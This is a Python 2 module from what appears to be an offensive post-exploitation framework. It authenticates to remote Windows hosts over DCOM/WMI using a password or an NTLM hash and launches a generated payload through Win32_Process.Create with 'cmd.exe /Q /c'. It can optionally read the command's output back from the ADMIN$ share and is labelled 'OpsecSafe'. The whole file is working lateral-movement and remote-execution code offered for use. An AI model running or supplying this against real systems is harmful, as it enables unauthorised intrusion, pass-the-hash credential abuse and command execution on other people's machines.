import socket
import string
import ntpath
from random import sample
from gevent import sleep
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

class Module:

    def __init__(self, mainMenu):

        self.mainMenu = mainMenu
        self.payload  = None

        self.info = {

            'Name': 'WMI Command Execution',
            'Author': ['@byt3bl33d3r'],
            'OpsecSafe' : True,
            'Description': ('Creates a process on the remote machine(s) using Windows Management Instrumentation.')
        
        }

        self.options = {

            'RHOSTS' : {
                'Description'   : 'Remote hosts',
                'Required'      : True,
                'Value'         : ''
            },


            'RPORT' : {
                
                'Description'   : 'Remote SMB port',
                'Required'      : True,
                'Value'         : '445'
            },

            'Domain' : {
                'Description'   : 'The Windows domain to use for authentication',
                'Required'      : False,
                'Value'         : ''

            },

            'USER' : {
                'Description'  : 'The username to  authenticate as',
                'Required'     : False,
                'Value'        : ''

            },

            'PASS' : {
                'Description'  : 'The password for the specified username',
                'Required'     : False,
                'Value'        : ''

            },

            'HASH' : {
                'Description'  : 'The NTLM hash for the specified username',
                'Required'     : False,
                'Value'        : ''

            },

            'SHARE' : {
                'Description' : 'Share where the output will be grabbed from',
                'Required'    : False,
                'Value'       : 'ADMIN$'
            }

        }

    def run(self, target):
        smb_port = int(self.options['RPORT']['Value'])
        user   = self.options['USER']['Value']
        passwd = self.options['PASS']['Value']
        domain = self.options['Domain']['Value']
        ntlm_hash  = self.options['HASH']['Value']
        get_output = False
        output_share = self.options['SHARE']['Value']
        
        cmd = self.payload.generate()

        lmhash = ''
        nthash = ''
        if ntlm_hash:
            lmhash, nthash = hashes.split(':')

        smbConnection = None
        try:
            if get_output is True:
                smbConnection = SMBConnection(target, target, None, smb_port)
                #if self.__doKerberos is False:
                smbConnection.login(user, passwd, domain, lmhash, nthash)
                #else:
                    #smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)

                #dialect = smbConnection.getDialect()
                #if dialect == SMB_DIALECT:
                #    logging.info("SMBv1 dialect used")
                #elif dialect == SMB2_DIALECT_002:
                #    logging.info("SMBv2.0 dialect used")
                #elif dialect == SMB2_DIALECT_21:
                #    logging.info("SMBv2.1 dialect used")
                #else:
                #    logging.info("SMBv3.0 dialect used")

            dcom = DCOMConnection(target, user, passwd, domain, lmhash, nthash, None, oxidResolver = True, doKerberos=False)
            print '{} Authenticated successfully via DCOM'.format(target)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process,_ = iWbemServices.GetObject('Win32_Process')

            wmiexec = WMIEXEC(output_share, win32Process, smbConnection, get_output)
            wmiexec.run(cmd)

            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()

        except socket.error:
            pass

class WMIEXEC:

    def __init__(self, share, win32Process, smbConnection, get_output):
        self.__share = 'ADMIN$'
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__get_output = get_output
        self.__output = '\\Temp\\' + ''.join(sample(string.ascii_letters, 10))

        if self.__transferClient is not None and self.__get_output is True:
            self.__transferClient.setTimeout(100000)
            self.cd('\\')

    def cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print self.__outputBuffer
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = self.__pwd + '>'
            self.__outputBuffer = ''

    def run(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print self.__outputBuffer
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = self.__pwd + '>'
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__get_output is False:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    sleep(1)
                    pass
                else:
                    #print str(e)
                    pass

        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data 
        if self.__get_output is True:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        print command
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''
